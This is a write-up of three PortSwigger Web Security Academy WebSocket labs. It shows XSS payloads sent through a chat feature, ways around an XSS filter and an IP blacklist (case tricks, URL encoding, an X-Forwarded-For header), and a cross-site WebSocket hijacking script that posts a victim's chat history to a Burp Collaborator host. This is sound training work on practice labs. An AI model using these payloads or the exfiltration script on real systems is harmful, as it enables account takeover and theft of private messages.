---
description: https://portswigger.net/web-security/websockets
---

# Testing for WebSockets security vulnerabilities

### Lab: Manipulating WebSocket messages to exploit vulnerabilities

This online shop has a live chat feature implemented using WebSockets. Chat messages that you submit are viewed by a support agent in real time.

`/chat` **-> Live chat**

```
→ To server
{"message":"test"}
← To client
{"user":"You","content":"test"}
```

There is just client side protection with html encoding.

Send the request to the repeater -> Reconnect -> Send this payload:

```
{"message":"<img src=1 onerror='alert(1)'>"}
```

### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

This online shop has a live chat feature implemented using WebSockets. It has an aggressive but flawed XSS filter.

`/chat` **-> Live chat**

```
→ To server
{"message":"<img onclick='alert(1)'>test</img>"}
← To client
{"error":"Attack detected: Event handler"}

→ To server
{"message":"<iframe src='javascript:alert(0)'>"}
← To client
{"error":"Attack detected: JavaScript"}

→ To server
{"message":"<iframe src='javascRipt:alert(0)'>"}
← To client
{"error":"Attack detected: Alert"}

→ To server
{"message":"<iframe src='javascRipt:%61lert(0)'>"}
a -> url encoded
```

To bypass being in blacklist, we can add this header to request header:&#x20;

`X-Forwarded-For: (any value)`

### Lab: Cross-site WebSocket hijacking

This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.

```
Request:
GET /chat HTTP/1.1
Host: acf21faf1e293867c0fd365700a700f3.web-security-academy.net
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Upgrade: websocket
Origin: https://acf21faf1e293867c0fd365700a700f3.web-security-academy.net
Sec-WebSocket-Version: 13
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=0eUxfWHWU1z3UUKb9xAUqwNhI0jPJe5f
Sec-WebSocket-Key: kLHi+hZ7ECII+qRH3585hQ==

Response:
HTTP/1.1 101 Switching Protocol
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: GQ79sfJLT+ljrMNywxhuWRsOD8Q=
Content-Length: 0

<form id="chatForm" action="wss://acf21faf1e293867c0fd365700a700f3.web-security-academy.net/chat">
```

There is no csrf protection in websocket handshake.

**Exploit Server ->**

```
Body:

  <script>
    var ws = new WebSocket('wss://acf21faf1e293867c0fd365700a700f3.web-security-academy.net/chat');
    ws.onopen = function() {
      ws.send("READY");
    };
    ws.onmessage = function(event) {
      fetch('https://gtdks02v6yt40r756at6r1o59wfm3b.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
    };
  </script>
```

```
Collaborator:

{"user":"Hal Pline","content":"No problem carlos, it's dqpl6qi78qaekjz7wh6d"}
```
